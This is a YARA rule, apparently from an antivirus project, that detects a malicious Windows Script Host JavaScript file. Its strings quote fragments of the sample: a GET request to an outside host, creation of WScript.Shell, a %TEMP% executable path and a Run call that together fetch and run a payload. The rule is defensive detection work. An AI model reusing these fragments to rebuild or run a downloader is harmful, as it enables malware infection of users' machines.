rule sig_20160401_9d6031fdde847398ceee60590b3e1422 {
  meta:
    description = "datamaliciousorder - file 20160401_9d6031fdde847398ceee60590b3e1422.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c488e35c50fcd54e8d4f93527baeb8e78a7c231cf07127402ed30d2710c7ac51"

  strings:
    $s1  = "SnZho[OoqFk](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "function LxgJg(LelOyp, FtbFd){UgwFr = UgwFr * 1; return LelOyp - FtbFd;};" fullword ascii
    $s3  = "var PsCm = function TeKrf() {return WScript[AgBd](\"WScript\"+\".Shell\");}(), VkjQs = 11;" fullword ascii
    $s4  = "if (SnZho[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JlhNo(){return XhwGd + \"\";};" fullword ascii
    $s6  = "function HqoBac() {return PsCm[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"i0qLXdQTo.ex\" + \"e\";};" fullword ascii
    $s7  = "function CtoVua() {return ((VquHa == true) && (VquHa == EaCz)) ? 1 : UgwFr;};" fullword ascii
    $s8  = "function OhOvm(PrwOuc){PsCm[\"R\"+\"un\"](PrwOuc, UgwFr, UgwFr);};" fullword ascii
    $s9  = "function FwJb()" fullword ascii
    $s10 = "function YsbYqh(KnsHv) {var IqiWf = (1, 2, 3, 4, 5, KnsHv); return IqiWf;};" fullword ascii
    $s11 = "function TvKw(){return 23;};" fullword ascii
    $s12 = "VquHa = true; " fullword ascii
    $s13 = "var HsiDvu = false;" fullword ascii
    $s14 = "EaCz = true; " fullword ascii
    $s15 = "return LxgJg(WxMxp, ImCz);" fullword ascii
    $s16 = "var EaCz = false;" fullword ascii
    $s17 = "}while (QdhWdd);" fullword ascii
    $s18 = "function CtfIu(){return AgBd;};" fullword ascii
    $s19 = "var VquHa = false;" fullword ascii
    $s20 = "var AsCg = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}